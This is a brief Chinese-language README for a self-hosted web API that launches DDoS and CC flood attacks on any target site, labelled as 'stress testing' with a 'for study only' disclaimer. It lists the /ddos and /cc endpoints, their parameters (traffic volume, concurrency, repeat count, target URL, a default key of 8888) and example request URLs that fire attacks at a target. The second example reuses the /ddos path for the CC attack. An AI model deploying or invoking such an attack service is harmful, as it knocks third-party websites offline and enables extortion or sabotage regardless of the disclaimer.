ddos/cc 攻击测压接口
仅供学习和交流使用，禁止用于非法用途
使用方式
1.ddos
假设部署的网站上 xxx.cn
那么 xxx.cn/ddos 为接口地址
参数： ll=流量（GB）bf=并发 cs=次数 wz=目标网站 key=密钥
必要参数 wz 和 key
key 默认为 8888
示例：
https://xxx.cn/ddos?wz=https://xxxx.cn&bf=100&cs=50&ll=1&key=8888
意思是：向目标网站发起并发为 100 次数为 50 总流量为 1GB 的 ddos 攻击
2.cc
假设部署的网站上 xxx.cn
那么 xxx.cn/cc 为接口地址
参数： bf=并发 cs=次数 wz=目标网站 key=密钥
必要参数 wz 和 key
示例：
https://xxx.cn/ddos?wz=https://xxxx.cn&bf=100&cs=50&key=8888
意思是：向目标网站发起并发为 100 次数为 50 的 cc 攻击



